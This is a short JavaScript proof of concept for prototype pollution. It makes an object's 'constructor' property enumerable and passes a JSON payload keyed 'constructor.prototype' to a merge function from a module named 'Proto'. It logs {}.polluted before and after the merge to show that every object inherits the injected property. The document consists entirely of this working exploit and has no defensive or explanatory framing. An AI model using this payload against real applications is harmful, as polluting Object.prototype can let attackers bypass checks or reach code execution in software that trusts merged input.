var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const proto = require('Proto');
let payload = '{"constructor.prototype": {"polluted":"yes"}}';
console.log({}.polluted);
proto.merge(obj, JSON.parse(payload));
console.log({}.polluted);